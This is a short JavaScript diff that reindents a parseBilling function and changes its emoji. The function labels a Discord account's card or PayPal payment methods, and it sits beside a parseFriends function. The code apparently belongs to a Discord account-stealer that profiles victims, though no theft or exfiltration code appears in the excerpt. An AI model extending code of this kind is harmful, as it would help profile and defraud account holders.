@@ -123,18 +123,18 @@ const parseFriends = friends => {
 }
 
 const parseBilling = billings => {
-    var Billings = ""
-    try{
-    if(!billings) return Billings = ":x:";
-    billings.forEach(res => {
-        if (res.invalid) return
-        switch (res.type) {
-            case 1:
-                Billings += ":heavy_check_mark: :credit_card:"
-                break
-            case 2:
-                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
-        }
+  var Billings = ""
+  try {
+      if (!billings) return Billings = ":x:";
+      billings.forEach(res => {
+          if (res.invalid) return
+          switch (res.type) {
+              case 1:
+                  Billings += "<:emoji_541:1249821102746898434> :credit_card:"
+                  break
+              case 2:
+                  Billings += "<:emoji_541:1249821102746898434> <:paypal:896441236062347374>"
+          }
     })
     if (!Billings) Billings = ":x:"
     return Billings
